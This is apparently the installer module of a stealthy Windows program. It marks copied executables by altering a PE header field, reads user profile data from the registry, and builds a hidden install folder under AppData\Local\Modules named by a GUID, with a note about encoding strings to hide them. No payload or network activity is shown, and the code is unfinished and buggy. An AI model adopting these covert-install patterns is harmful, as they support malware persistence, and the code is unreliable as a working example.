#include "install.h"
#include <tchar.h>
#include <Shlwapi.h>
#include <cstdint>
#include <memory>
#include <algorithm>
#include <string>
#include <cstdtchar>
#include "balkin.hpp"

#define WINXP 5
#define WINVISTA 6
#define WIN7  7

/* ''Installed'' executable will have its e_maxalloc sub'd by 1 when it is copied
 *		to where it needs to be.
 *	If the current process was not executed from this modified exe, then when we
 *		assume there is work to do.
 *
 */
extern "C" bool __stdcall is_installed_image(HINSTANCE hInst)
{
	bool retval = false;

	__asm
	{
			push ebx
			xor eax, eax
			mov ebx, hInst
			mov ax, word ptr [ebx+0Ch]
			lea ebx, retval
			btr ax, 0
			jc keepfalse
			mov [ebx], 1
	keepfalse:
			pop ebx
	}

	return retval;
}


balkinstaller::balkinstaller(const int winVer)
{
	p_winver = winVer;

	p_homedir = NULL;

	// for storing the guid string which equals our sha1. we will use as folder name */
	p_myident = new TCHAR[42];
}

balkinstaller::~balkinstaller()
{
	if (p_homedir != NULL)
		delete[] p_homedir;

	if (p_myident != NULL)
		delete[] p_myident;
}

void balkinstaller::obtain_identifiers(const unique_persist& pers)
{
	GUID callsign = pers.hash_guids.uuid[0];
	TCHAR stringy[42] = {0};
	StringFromGUID2(callsign, reinterpret_cast<LPOLESTR>(&stringy), 42);
	_tcscpy_s(p_myident, 42, stringy);
}

bool balkinstaller::gethome_one()
{
	const size_t bufSz = MAX_PATH;
	TCHAR *pathBuf = new TCHAR[bufSz];
	TCHAR **usrfldr  = NULL;
	intptr_t home1, home2;
	size_t		 homeSize = 0;
	
	#ifdef _UNICODE
		std::fill<TCHAR*, TCHAR>(pathBuf, pathBuf+bufSz, '\x00\x00');
	#else
		std::fill<TCHAR*, TCHAR>(pathBuf, pathBuf+bufSz, '\0');
	#endif

	const unsigned long res = GetEnvironmentVariable(g_userprofile, pathBuf, bufSz-1);

	if (res == 0 || GetLastError() == ERROR_ENVVAR_NOT_FOUND)
		goto gh1_failfree;

	/* select default name of the users folder based on version of windows*/
	switch(this->p_winver)
	{
		case WINXP:
			usrfldr = &g_dnsfolder;
		break;
		case WINVISTA:
			usrfldr = &g_usrfolder;
		break;
		case WIN7:
			usrfldr = &g_usrfolder;
		break;
		default:
			goto gh1_failfree;
		break;
	}

	std::tstring *homecmp = new std::tstring(pathBuf, bufSz);

	/* Make sure default user dir can be found */
	if (homecmp->rfind(*usrfldr) == std::tstring::npos)
	{
		delete homecmp;
		goto gh1_failfree;
	}
	// fugly pointer math lies below :)
	home1 = reinterpret_cast<intptr_t>(pathBuf);
	home2 = home1;
	// Get the size of the path string excluding the current user's name
	home2 += sizeof(TCHAR)*homecmp->find(*usrfldr, 0)+sizeof(TCHAR)*_tcslen(*usrfldr);
	++home2; // FOR BACKSLASH
	#ifdef _UNICODE
		home2++; // FOR BACKSLASH
	#endif
	homeSize = home2 - home1;
		
	if (p_homedir != NULL)
		delete[] p_homedir;

	/* * *
	 * Store the UserProfile aka Home folder's path here in p_homedir.
	 * The Profiles directory will be stored in users_folders.
	 * * install_path will point to a location within the user's local data
	 * * after a few more procedures
	 * */
	p_homedir = new TCHAR[MAX_PATH+1];
	_tcsncpy_s(p_homedir, MAX_PATH+1, homecmp->c_str(), _tcslen(homecmp->c_str())+sizeof(TCHAR));
	this->install_path = std::tstring(pathBuf, reinterpret_cast<TCHAR*>(home2));
	this->users_folders = this->install_path;

	this->user_name = PathFindNextComponent(p_homedir+homecmp->find_last_of(TEXT("\\")));

	delete homecmp;
	

	delete[] pathBuf;
	return true;

gh1_failfree:
	delete[] pathBuf;
	return false;
}

bool balkinstaller::gethome_two()
{
	HKEY hkVE = NULL;
	LSTATUS lRes = ERROR_SUCCESS;
	DWORD dwUN, dwUP, bSize, dwDiff;
	TCHAR *buffer, *buffer2;
	// TODO: HAVE THIS PRE-ENCODED & DECODED ON THE FLY 
	TCHAR *lmprof = _T("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList");
	
	buffer = NULL;

	/* * We will attempt obtaining env. variables from the registry... * *
	 * If that fails, we will pull it directly from HKLM/../WinNT.		 *
	 * */
	if (RegOpenKeyEx(HKEY_CURRENT_USER, TEXT("Volatile Environment"), 0, KEY_READ | KEY_WOW64_64KEY, &hkVE) != ERROR_SUCCESS)
	{
		hkVE = NULL;
		goto gh2_secmethod;
	}

	lRes |= RegQueryValueEx(hkVE, g_username, 0, NULL, NULL, &dwUN) | RegQueryValueEx(hkVE, g_userprofile, 0, NULL, NULL, &dwUP);

	if (lRes != ERROR_SUCCESS)
	{
		lRes = 600L;
		goto gh2_secmethod;
	}

	/* Allocate buffer for user name and user profile */
	bSize = dwUN+dwUP+4*sizeof(TCHAR);
	buffer = new TCHAR[bSize];
	buffer2 = buffer+dwUN;

	lRes |= RegQueryValueEx(hkVE, g_username, 0, NULL, (LPBYTE) buffer, &dwUN) | RegQueryValueEx(hkVE, g_userprofile, 0, NULL, (LPBYTE) buffer2, &dwUP);

	if (lRes != ERROR_SUCCESS)
	{
		std::realloc((void*)buffer, MAX_PATH+1);
		lRes = 700L;
	}
	/* Store the UP and the UN separately
	 * * *
	 * * If any env. variables were expanded, then dwUP and/or dwUN will
	 * * have wrong size count.
	 * */
	this->user_name = std::tstring(buffer);
	// 1st we just want the actual Profiles directory.
	dwDiff = _tcslen(buffer2) - dwUN/sizeof(TCHAR);
	this->users_folders = std::tstring(buffer2, buffer2+dwDiff);
	this->install_path = std::tstring(buffer2);
	// Restore to dwDiff to full path size + null char.
	dwDiff += sizeof(TCHAR)+dwUN/sizeof(TCHAR);
	/* * Zero out & set p_homedir to the... uh, home dir
	 * * * Other functions depend on p_homedir being allocated & set
	 * * * TODO: Rework 2 string container later
	 */
	p_homedir = new TCHAR[MAX_PATH+1];
	std::fill<TCHAR*, TCHAR>(p_homedir, p_homedir+MAX_PATH, _T('\x00'));
	std::copy_n<TCHAR*,DWORD,TCHAR*>(buffer2, dwDiff, p_homedir);
	delete[] buffer;

	RegCloseKey(hkVE);

	return true;

gh2_secmethod:

	DWORD dwRegSz, dwRealSz;

	if (lRes != ERROR_SUCCESS)
	{
		if ((lRes & 600L) == lRes)
			RegCloseKey(hkVE);

		if ((lRes ^ 600L) >= 100L)
			buffer = new TCHAR[MAX_PATH+1];

		lRes = ERROR_SUCCESS;
	}
	else
	{
		try
		{
			TCHAR tst;

			tst = *buffer;
		}
		catch(...)
		{
			buffer = new TCHAR[MAX_PATH+1];
		}
		if (buffer == NULL)
			buffer = new TCHAR[MAX_PATH+1];
	}

	std::fill<TCHAR*, TCHAR>(buffer, buffer+MAX_PATH, _T('\x00'));

	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, lmprof, 0, KEY_READ | KEY_WOW64_64KEY, &hkVE) != lRes)
		return false;

	lRes |= RegQueryValueEx(hkVE, _T("ProfilesDirectory"), 0, NULL, (LPBYTE) buffer, &dwRegSz);

	if (lRes != ERROR_SUCCESS)
	{
		delete[] buffer;
		return false;
	}

	/* Append backslash */
	dwRealSz = _tcslen(buffer);
	std::fill_n<TCHAR*,DWORD,TCHAR>(buffer+dwRealSz, 1, _T('\\'));
	dwRealSz++;


	// TODO:
	//  FINISH THE ALTERNATE WAY
	//
	RegCloseKey(hkVE);

	return true;
}

bool balkinstaller::getdata_one()
{
	short sucess = 0;
	std::tstring tbuf(p_homedir);

	if (p_winver >= 6)
	{
		tbuf += TEXT("\\AppData\\");

		if(PathIsDirectory(tbuf.c_str()) == 0)
			return false;

		sucess++;
		tbuf += TEXT("Local\\");

		if(PathIsDirectory(tbuf.c_str()) == 0)
			return false;
		++sucess;

		if (sucess == 2)
			this->install_path.assign(tbuf);
	}


	return true;
}

long balkinstaller::do_installation()
{
	bool bCheck = true;

	bCheck &= this->gethome_two();

	if (!bCheck)
	{
		bCheck = true;
		// do second method
	}

	bCheck &= this->getdata_one();

	if (!bCheck)
	{
		bCheck = true;
		// do second method
	}

	install_path += TEXT("Modules\\");
	install_path = install_path + p_myident + _T("\\");

	return 0;
}